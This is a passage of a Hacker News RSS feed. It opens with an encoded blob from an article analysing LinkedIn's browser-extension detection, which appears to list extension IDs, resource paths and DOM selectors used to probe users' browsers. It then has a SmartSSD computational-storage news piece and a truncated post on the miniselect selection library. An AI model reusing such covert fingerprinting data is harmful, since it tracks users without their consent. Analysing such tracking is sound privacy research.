xXHUwMDZkXHUwMDY1IjoiXHUwMDc3XHUwMDQ0XHUwMDQzXHUwMDQ3XHUwMDU3XHUwMDRiXHUwMDY2XHUwMDczXHUwMDY0XHUwMDVhIiwiXHUwMDY5XHUwMDZlXHUwMDc0XHUwMDY1XHUwMDcyXHUwMDc2XHUwMDYxXHUwMDZjIjo4NjQwMDAwMCwiXHUwMDY0XHUwMDYxXHUwMDc0XHUwMDY1IjowLCJcdTAwNzRcdTAwNmZcdTAwNzBcdTAwNTBcdTAwNjFcdTAwNzRcdTAwNjgiOlsiXHUwMDcwXHUwMDcyXHUwMDZmXHUwMDY2XHUwMDY5XHUwMDZjXHUwMDY1IiwiXHUwMDcyXHUwMDY1XHUwMDYzXHUwMDcyXHUwMDc1XHUwMDY5XHUwMDc0XHUwMDY1XHUwMDcyIl0sIlx1MDA2NFx1MDA2Zlx1MDA2ZCI6eyJcdTAwNzNcdTAwNjVcdTAwNmNcdTAwNjVcdTAwNjNcdTAwNzRcdTAwNmZcdTAwNzIiOlsiXHUwMDIzXHUwMDY0XHUwMDZjXHUwMDc5XHUwMDVmXHUwMDY5XHUwMDYzXHUwMDZmXHUwMDZlXHUwMDVmXHUwMDYxXHUwMDcyXHUwMDY1XHUwMDYxIl19LCJcdTAwNzBcdTAwNjFcdTAwNzRcdTAwNjgiOlsiXHUwMDY0XHUwMDY5XHUwMDZhXHUwMDY4XHUwMDYzXHUwMDcwXHUwMDYyXHUwMDZiXHUwMDYxXHUwMDZjXHUwMDY2XHUwMDY3XHUwMDZiXHUwMDYzXHUwMDY1XHUwMDYyXHUwMDY3XHUwMDZmXHUwMDZlXHUwMDYzXHUwMDZhXHUwMDZkXHUwMDY2XHUwMDcwXHUwMDYyXHUwMDYxXHUwMDZkXHUwMDY5XHUwMDY4XHUwMDY3XHUwMDYxXHUwMDY2XHUwMDJmXHUwMDZjXHUwMDY5XHUwMDVmXHUwMDczXHUwMDZmXHUwMDYzXHUwMDY5XHUwMDYxXHUwMDZjXHUwMDVmXHUwMDcwXHUwMDZjXHUwMDc1XHUwMDY3XHUwMDY5XHUwMDZlXHUwMDJlXHUwMDYzXHUwMDczXHUwMDczIl19LHsiXHUwMDZlXHUwMDYxXHUwMDZkXHUwMDY1IjoiXHUwMDUwXHUwMDQ3XHUwMDRkXHUwMDU2XHUwMDQ0XHUwMDczXHUwMDY2IiwiXHUwMDY5XHUwMDZlXHUwMDc0XHUwMDY1XHUwMDcyXHUwMDc2XHUwMDYxXHUwMDZjIjozNjAwMDAwLCJcdTAwNjRcdTAwNjFcdTAwNzRcdTAwNjUiOjAsIlx1MDA3NFx1MDA2Zlx1MDA3MFx1MDA1MFx1MDA2MVx1MDA3NFx1MDA2OCI6WyJcdTAwNzBcdTAwNzJcdTAwNmZcdTAwNjZcdTAwNjlcdTAwNmNcdTAwNjUiLCJcdTAwNzJcdTAwNjVcdTAwNjNcdTAwNzJcdTAwNzVcdTAwNjlcdTAwNzRcdTAwNjVcdTAwNzIiXSwiXHUwMDY0XHUwMDZmXHUwMDZkIjp7Ilx1MDA3M1x1MDA2NVx1MDA2Y1x1MDA2NVx1MDA2M1x1MDA3NFx1MDA2Zlx1MDA3MiI6WyJcdTAwMmVcdTAwNjVcdTAwNjNcdTAwNzFcdTAwNzVcdTAwNjlcdTAwNzJcdTAwNjVcdTAwMmRcdTAwNjJcdTAwNzVcdTAwNzRcdTAwNzRcdTAwNmZcdTAwNmUiXX0sIlx1MDA3MFx1MDA2MVx1MDA3NFx1MDA2OCI6W119LHsiXHUwMDZlXHUwMDYxXHUwMDZkXHUwMDY1IjoiXHUwMDUwXHUwMDc4XHUwMDQzXHUwMDc5XHUwMDRmXHUwMDRjXHUwMDU2XHUwMDY0XHUwMDY0XHUwMDQ2XHUwMDU3XHUwMDczXHUwMDU4IiwiXHUwMDY5XHUwMDZlXHUwMDc0XHUwMDY1XHUwMDcyXHUwMDc2XHUwMDYxXHUwMDZjIjo4NjQwMDAwMCwiXHUwMDY0XHUwMDYxXHUwMDc0XHUwMDY1IjowLCJcdTAwNzRcdTAwNmZcdTAwNzBcdTAwNTBcdTAwNjFcdTAwNzRcdTAwNjgiOlsiXHUwMDcwXHUwMDcyXHUwMDZmXHUwMDY2XHUwMDY5XHUwMDZjXHUwMDY1IiwiXHUwMDcyXHUwMDY1XHUwMDYzXHUwMDcyXHUwMDc1XHUwMDY5XHUwMDc0XHUwMDY1XHUwMDcyIl0sIlx1MDA2NFx1MDA2Zlx1MDA2ZCI6eyJcdTAwNzNcdTAwNjVcdTAwNmNcdTAwNjVcdTAwNjNcdTAwNzRcdTAwNmZcdTAwNzIiOlsiXHUwMDIzXHUwMDY1XHUwMDYyXHUwMDczXHUwMDc0XHUwMDYxXHUwMDYyXHUwMDYxXHUwMDcyIl19LCJcdTAwNzBcdTAwNjFcdTAwNzRcdTAwNjgiOlsiXHUwMDYyXHUwMDZlXHUwMDY1XHUwMDY1XHU…</code></pre></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://prophitt.me/a-look-at-how-linkedin-exfiltrates-extension-data-from-their-users">https://prophitt.me/a-look-at-how-linkedin-exfiltrates-extension-data-from-their-users</a></em></p>]]>
            </description>
            <link>https://prophitt.me/a-look-at-how-linkedin-exfiltrates-extension-data-from-their-users</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060089</guid>
            <pubDate>Wed, 11 Nov 2020 16:58:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Xilinx-Samsung SmartSSD Computational Storage Drive Launched]]>
            </title>
            <description>
<![CDATA[
Score 115 | Comments 81 (<a href="https://news.ycombinator.com/item?id=25059946">thread link</a>) | @blopeur
<br/>
November 11, 2020 | https://www.servethehome.com/xilinx-samsung-smartssd-computational-storage-drive-launched/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/xilinx-samsung-smartssd-computational-storage-drive-launched/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/11/smartssd-pr-1120x560-1.jpg" data-caption="Smartssd Pr 1120x560"><img width="696" height="461" src="https://www.servethehome.com/wp-content/uploads/2020/11/smartssd-pr-1120x560-1-696x461.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/smartssd-pr-1120x560-1-696x461.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/11/smartssd-pr-1120x560-1-400x265.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/11/smartssd-pr-1120x560-1-634x420.jpg 634w, https://www.servethehome.com/wp-content/uploads/2020/11/smartssd-pr-1120x560-1.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="Smartssd Pr 1120x560" title="Smartssd Pr 1120x560"></a><figcaption>Smartssd Pr 1120x560</figcaption></figure></div>
            <!-- content --><p>Computational storage is a small but growing segment of the market. To address this, the Samsung SmartSSD is being launched with a Xilinx Kintex FPGA inside to bring computational storage capabilities in a standard form factor. In this article, we are going to discuss how Xilinx and Samsung are delivering a computational storage platform.<span id="more-48283"></span></p>
<h2>Xilinx-Samsung SmartSSD Background</h2>
<p>First, why computational storage. One of the big drivers is that moving data, at high speeds, across systems can use a lot of power and consumes bandwidth. With computational storage, data can be processed without bringing it back to the main CPU.</p>
<figure id="attachment_48289" aria-describedby="caption-attachment-48289"><a href="https://www.servethehome.com/?attachment_id=48289" rel="attachment wp-att-48289"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand.png" alt="Xilinx SmartSSD Computational Storage Demand" width="1511" height="825" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand.png 1511w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand-400x218.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand-800x437.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand-696x380.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand-1068x583.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand-769x420.png 769w" sizes="(max-width: 1511px) 100vw, 1511px"></a><figcaption id="caption-attachment-48289">Xilinx SmartSSD Computational Storage Demand</figcaption></figure>
<p>Part of the other driver here is that Xilinx sees computational storage as becoming mainstream, projected to be 5% of the market in only a few years. For its part, Xilinx is covering a number of different types of accelerators aside form the Samsung SmartSSD including those from Pliops, ScaleFlux, and BittWare.</p>
<figure id="attachment_48288" aria-describedby="caption-attachment-48288"><a href="https://www.servethehome.com/?attachment_id=48288" rel="attachment wp-att-48288"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream.png" alt="Xilinx SmartSSD Computational Storage Becoming Mainstream" width="1481" height="781" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream.png 1481w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream-400x211.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream-800x422.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream-696x367.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream-1068x563.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream-796x420.png 796w" sizes="(max-width: 1481px) 100vw, 1481px"></a><figcaption id="caption-attachment-48288">Xilinx SmartSSD Computational Storage Becoming Mainstream</figcaption></figure>
<p>The basic Samsung SmartSSD has two main sets of components. One is basically a 4TB Samsung V-NAND SSD. This includes a NAND controller, and we are told DRAM for the controller to use as well. The second part of the solution is a Xilinx Kintex FPGA with its own 4GB of memory.</p>
<figure id="attachment_48285" aria-describedby="caption-attachment-48285"><a href="https://www.servethehome.com/?attachment_id=48285" rel="attachment wp-att-48285"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components.png" alt="Samsung Xilinx SmartSSD Internal Components" width="1263" height="783" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components.png 1263w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components-400x248.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components-800x496.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components-696x431.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components-1068x662.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components-677x420.png 677w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components-356x220.png 356w" sizes="(max-width: 1263px) 100vw, 1263px"></a><figcaption id="caption-attachment-48285">Samsung Xilinx SmartSSD Internal Components</figcaption></figure>
<p>The basic flow is that commands can be issued to either the SSD or the FPGA portion of the drive and processing can occur at the FPGA instead of going back to the host system.</p>
<figure id="attachment_48286" aria-describedby="caption-attachment-48286"><a href="https://www.servethehome.com/?attachment_id=48286" rel="attachment wp-att-48286"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation.png" alt="Samsung Xilinx SmartSSD Internal Operation" width="1456" height="836" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation.png 1456w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation-400x230.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation-800x459.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation-696x400.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation-1068x613.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation-731x420.png 731w" sizes="(max-width: 1456px) 100vw, 1456px"></a><figcaption id="caption-attachment-48286">Samsung Xilinx SmartSSD Internal Operation</figcaption></figure>
<p>We are going to show an example later but a common question will be how are these programmed. One can use a standard storage stack or the OpenCL stack for computational storage aspects.</p>
<figure id="attachment_48291" aria-describedby="caption-attachment-48291"><a href="https://www.servethehome.com/?attachment_id=48291" rel="attachment wp-att-48291"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack.png" alt="Xilinx SmartSSD IP Runtime Stack" width="1470" height="723" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack.png 1470w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-400x197.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-800x393.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-696x342.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-1068x525.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-854x420.png 854w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-324x160.png 324w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-533x261.png 533w" sizes="(max-width: 1470px) 100vw, 1470px"></a><figcaption id="caption-attachment-48291">Xilinx SmartSSD IP Runtime Stack</figcaption></figure>
<p>As one would expect with a FPGA, there is a tie in with partner IP solutions as well as those that Xilinx and Samsung will have.</p>
<figure id="attachment_48290" aria-describedby="caption-attachment-48290"><a href="https://www.servethehome.com/?attachment_id=48290" rel="attachment wp-att-48290"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development.png" alt="Xilinx SmartSSD IP Development" width="1487" height="727" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development.png 1487w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development-400x196.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development-800x391.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development-696x340.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development-1068x522.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development-859x420.png 859w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development-533x261.png 533w" sizes="(max-width: 1487px) 100vw, 1487px"></a><figcaption id="caption-attachment-48290">Xilinx SmartSSD IP Development</figcaption></figure>
<p>The Xilinx Storage Services (XSS) are offloads available for the platform. These include compression and crypto offloads.</p>
<figure id="attachment_48292" aria-describedby="caption-attachment-48292"><a href="https://www.servethehome.com/?attachment_id=48292" rel="attachment wp-att-48292"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services.png" alt="Xilinx SmartSSD IP Xilinx Storage Services" width="1531" height="786" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services.png 1531w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services-400x205.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services-800x411.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services-696x357.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services-1068x548.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services-818x420.png 818w" sizes="(max-width: 1531px) 100vw, 1531px"></a><figcaption id="caption-attachment-48292">Xilinx SmartSSD IP Xilinx Storage Services</figcaption></figure>
<p>Taking the compression in VDO as an example, the following slides have the basic flow:</p>
<figure id="attachment_48294" aria-describedby="caption-attachment-48294"><a href="https://www.servethehome.com/?attachment_id=48294" rel="attachment wp-att-48294"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1.png" alt="Xilinx SmartSSD VDO 1" width="1379" height="780" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1.png 1379w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1-400x226.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1-800x453.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1-696x394.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1-1068x604.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1-743x420.png 743w" sizes="(max-width: 1379px) 100vw, 1379px"></a><figcaption id="caption-attachment-48294">Xilinx SmartSSD VDO 1</figcaption></figure>
<p>For reads, the FPGA is used to decompress data at the SmartSSD. By putting the compression on the SSD, Xilinx says it can get better compression ratios.</p>
<figure id="attachment_48295" aria-describedby="caption-attachment-48295"><a href="https://www.servethehome.com/?attachment_id=48295" rel="attachment wp-att-48295"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2.png" alt="Xilinx SmartSSD VDO 2" width="1447" height="784" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2.png 1447w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2-400x217.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2-800x433.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2-696x377.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2-1068x580.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2-775x420.png 775w" sizes="(max-width: 1447px) 100vw, 1447px"></a><figcaption id="caption-attachment-48295">Xilinx SmartSSD VDO 2</figcaption></figure>
<p>In terms of examples, we wanted to highlight one from Lewis Rhodes Labs where they are doing NPUSearch using computational storage. Effectively here the SmartSSDs are being used to scale out the number of accelerators with the number of SSDs. An application can send requests to the storage, data can be evaluated at the drives, and only results passed back to the main system.</p>
<figure id="attachment_48293" aria-describedby="caption-attachment-48293"><a href="https://www.servethehome.com/?attachment_id=48293" rel="attachment wp-att-48293"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search.png" alt="Xilinx SmartSSD Lewis Rhodes Labs Search" width="1538" height="837" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search.png 1538w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search-400x218.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search-800x435.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search-1536x836.png 1536w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search-696x379.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search-1068x580.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search-772x420.png 772w" sizes="(max-width: 1538px) 100vw, 1538px"></a><figcaption id="caption-attachment-48293">Xilinx SmartSSD Lewis Rhodes Labs Search</figcaption></figure>
<p>Since many of our readers will have noticed this, we asked about the PCIe Gen3 and we were told that there is a roadmap to the future.</p>
<h2>Final Words</h2>
<p>For STH readers, an immediate question is going to be why computational storage? Part of this model is that accelerators are tied to storage. For accelerator companies, this is great. Many of our readers though are going to ask about why not use DPUs instead. If you missed it&nbsp;<a href="https://www.servethehome.com/what-is-a-dpu-a-data-processing-unit-quick-primer/">What is a DPU A Data Processing Unit Quick Primer</a> is a good resource there. We asked since if the only goal is offload, and the SmartSSD is in many ways two devices that are co-packaged, then it could make sense to offload to a bigger chip. We were told that it is less expensive to use a smaller accelerator on each drive than to scale to a larger accelerator. This is one area that we know there is a lot of momentum behind each model in the data center. It will be interesting to see which ultimately wins.</p>
        </div></div>]]>
            </description>
            <link>https://www.servethehome.com/xilinx-samsung-smartssd-computational-storage-drive-launched/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059946</guid>
            <pubDate>Wed, 11 Nov 2020 16:46:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Miniselect: Practical and Generic Selection Algorithms]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25059942">thread link</a>) | @cristaloleg
<br/>
November 11, 2020 | https://danlark.org/2020/11/11/miniselect-practical-and-generic-selection-algorithms/ | <a href="https://web.archive.org/web/*/https://danlark.org/2020/11/11/miniselect-practical-and-generic-selection-algorithms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-555">

	

	
	<div>
		
<p>Today I present a big effort from my side to publish <a href="https://github.com/danlark1/miniselect">miniselect</a> — generic C++ library to support multiple selection and partial sorting algorithms. It is already <a href="https://github.com/ClickHouse/ClickHouse/pull/16825">used</a> in <a href="https://clickhouse.tech/">ClickHouse</a> with huge performance benefits. Exact benchmarks and results will be later in this post and now let’s tell some stories about how it all arose. I publish this library under Boost License and any contributions are highly welcome.</p>



<h2>It all started with sorting</h2>



<p>While reading lots of articles, papers, and posts from Hacker News, I found it pretty funny each several months new “shiny”, “fastest”, “generic” sorting algorithms to come or remembered from old papers such as the recent paper on <a href="https://blog.acolyer.org/2020/10/19/the-case-for-a-learned-sorting-algorithm/">learned sorting</a>, <a href="https://sortingsearching.com/2020/06/06/kirkpatrick-reisch.html">Kirkpatrick-Reisch</a> sort or <a href="https://news.ycombinator.com/item?id=14661659">pdqsort</a>. It is that we are essentially 65+ years into writing sorting algorithms, and we still find improvements. Shouldn’t sorting items be a “solved” problem by now? Unfortunately, not. New hardware features come, we find that sorting numbers can be actually done faster than best comparison <img src="https://s0.wp.com/latex.php?latex=O%28n+%5Clog+n%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n \log n)" title="O(n \log n)"> time complexity and we still find improvements in sorting algorithms like avoiding <a href="https://www.researchgate.net/publication/301614727_BlockQuicksort_How_Branch_Mispredictions_don't_affect_Quicksort">branches in partitions</a> and trying to find good pivots as pdqsort does. Also, there are many open questions in that area as “what is the minimum number of comparisons needed?”.</p>



<p>Huge competition is still going on in sorting algorithms and I believe we are not near the optimal sorting and learned sorting looks like the next step. But it uses the fundamental fact that no one expects sorting to be completed in a couple of passes and we can understand something about data during first array passes. We will understand why it matters later.</p>



<p>My favorite general sorting is <a href="https://github.com/orlp/pdqsort">pdqsort</a>, it proves to be currently the best general sorting algorithm and it shows a significant boost over all standard sorts that are provided in C++. It is also <a href="https://docs.rs/pdqsort/1.0.3/pdqsort/">used</a> in Rust.</p>



<h2>Selection and Partial Sorting</h2>



<p>Nearly a couple of months ago I started thinking about a slightly different approach when it comes to sorting — partial sorting algorithms. It means that you don’t need to sort all <img src="https://s0.wp.com/latex.php?latex=n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n" title="n"> elements but only find <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> smallest and sort them. For example, it is widely used in SQL queries when you do <code>ORDER BY LIMIT N</code> and <code>N</code> is often small, from 1-10 to ideally couple of thousands, bigger values still happen but rare. And, oh god, how little engineering and theoretical research has been done there compared to full sorting algorithms. In fact, the question of specifically finding <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k">th order statistics when <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> is small is open and no good solution is presented. Also, partial sorting is quite easy to obtain after that, you need to sort the first <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> elements by some sorting algorithm to get optimal <img src="https://s0.wp.com/latex.php?latex=O%28n+%2B+k+%5Clog+k%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n + k \log k)" title="O(n + k \log k)"> comparisons and we will look at only one example when it is not the case. Yes, there are a bunch of median algorithms that can be generalized to find the <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k">th smallest element. So, what are they? Yeah, you may know some of them but let’s revise, it is useful to know your enemies.</p>



<h3>QuickSelect</h3>



<p>This is almost the very first algorithm for finding the <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k">th smallest element, just do like <a href="https://en.wikipedia.org/wiki/Quicksort">QuickSort</a> but don’t go recursively in two directions, that’s it. Pick middle or even random element and partition by this element, see in which of two parts <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> is located, update the one of the borders, voila, after maximum of <img src="https://s0.wp.com/latex.php?latex=n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n" title="n"> partitions you will find <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k">th smallest element. Good news that on average it takes <img src="https://s0.wp.com/latex.php?latex=O%28n%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n)" title="O(n)"> comparisons if we pick random pivot. That is because if we define <img src="https://s0.wp.com/latex.php?latex=C%28n%2C+k%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="C(n, k)" title="C(n, k)"> is the expected number of comparisons for finding <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k">th element in <img src="https://s0.wp.com/latex.php?latex=n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n" title="n"> elements and <img src="https://s0.wp.com/latex.php?latex=C%28n%29+%3D+%5Cmax_%7B1%7D%5E%7Bn%7D+C%28n%2C+k%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="C(n) = \max_{1}^{n} C(n, k)" title="C(n) = \max_{1}^{n} C(n, k)">, then during one stage we do <img src="https://s0.wp.com/latex.php?latex=n+-+1&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n - 1" title="n - 1"> comparisons and uniformly pick any pivot, then even if we pick the biggest part on each step</p>



<p><img src="https://s0.wp.com/latex.php?latex=%5Cdisplaystyle+C%28n%29+%5Cleq+n+-+1+%2B+%5Cfrac%7B1%7D%7Bn%7D%5Csum_%7Bn%2F2%7D%5E%7Bn+-+1%7D+C%28i%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="\displaystyle C(n) \leq n - 1 + \frac{1}{n}\sum_{n/2}^{n - 1} C(i)" title="\displaystyle C(n) \leq n - 1 + \frac{1}{n}\sum_{n/2}^{n - 1} C(i)"></p>



<p><img src="https://s0.wp.com/latex.php?latex=%5Cdisplaystyle+C%28n%29+%5Cleq+%28n+-+1%29+%2B+%5Cmathrm%7Bavg%7D%28C%28n%2F2%29%2C+%5Cldots%2C+C%28n%29%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="\displaystyle C(n) \leq (n - 1) + \mathrm{avg}(C(n/2), \ldots, C(n))" title="\displaystyle C(n) \leq (n - 1) + \mathrm{avg}(C(n/2), \ldots, C(n))"></p>



<p>If assuming by induction that <img src="https://s0.wp.com/latex.php?latex=C%28i%29+%5Cleq+4i&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="C(i) \leq 4i" title="C(i) \leq 4i"> with an obvious induction base, we get</p>



